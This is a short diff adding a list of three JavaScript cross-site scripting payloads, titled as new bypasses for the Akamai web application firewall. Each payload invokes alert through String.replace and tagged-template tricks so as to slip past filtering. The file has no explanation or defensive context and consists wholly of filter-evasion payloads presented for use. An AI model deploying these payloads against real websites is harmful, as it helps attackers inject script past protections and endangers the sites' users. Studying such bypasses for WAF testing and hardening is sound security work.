@@ -1,0 +1,7 @@
+↳ New Akamai WAF Bypasses
+• Payload 1:
+'a'.replace.call`1${/./}${alert}`
+• Payload 2:
+'a,'.replace`a${alert}`
+• Payload 3:
+'a'.replace(/./,alert)
